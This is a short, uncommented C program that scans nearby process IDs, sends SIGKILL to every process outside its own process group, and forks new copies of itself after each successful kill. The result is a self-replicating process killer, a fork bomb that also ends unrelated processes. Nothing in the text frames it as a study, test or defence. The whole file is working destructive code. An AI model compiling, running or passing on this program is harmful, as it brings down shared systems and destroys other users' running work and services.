#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <sys/wait.h>

int main(){

	int max = 300;
	int min = 200;
	int parent = 0;
	int group = getpgid(0);

	do  {
		int place = 1;
		int check = 0;
		while (place < max) {
			int mypid = getpid();

			if (getpgid(mypid+place) != group) {
				if (!kill(mypid+place, SIGKILL)) {
					pid_t p = fork();
					if (p > 0) {
						parent = 1;
					} else if ( p < 0) {
						waitpid(-1, NULL, WNOHANG);
					}
				}
			} else {
				if(++check > max*.8) {
					waitpid(-1, NULL, WNOHANG);
				}
			}
			
			if (getpgid(mypid-place) != group) {
				if (place < min) {
					kill(mypid-place, SIGKILL);
					pid_t p2 = fork();
					if (p2  > 0) {
						parent = 1;
					}
				}
			}
			++place;
		} 
	} while (parent);
}

